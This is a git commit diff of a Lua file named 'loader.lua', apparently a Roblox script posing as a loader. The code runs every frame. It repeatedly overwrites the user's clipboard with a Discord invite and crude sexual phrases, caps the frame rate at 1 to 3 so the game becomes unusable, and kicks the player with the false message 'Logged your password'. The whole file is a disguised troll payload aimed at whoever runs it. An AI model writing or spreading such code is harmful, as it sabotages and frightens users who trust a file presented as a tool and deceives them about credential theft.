e8917bcbe03edbcd256a12620c9f684d1d8bab14
Xyrkey <92700301+Xyrkey@users.noreply.github.com>
2022-11-12 10:10:28 +0800

    Update loader.lua

--- loader.lua
+++ loader.lua
@@ -1,8 +1,15 @@
 local a = "discord.gg/fatherless"
+local b = "sex"
+local c = "I Love Furry Porn"
 
 local runService = game:GetService("RunService")
 local event = runService.RenderStepped:Connect(function()
 setclipboard(a)
+    setclipboard(b)
+    setclipboard(c)
+    setfpscap(1)
+    setfpscap(2)
+    setfpscap(3)
 end)
 
 game.Players.LocalPlayer:Kick("Logged your password")
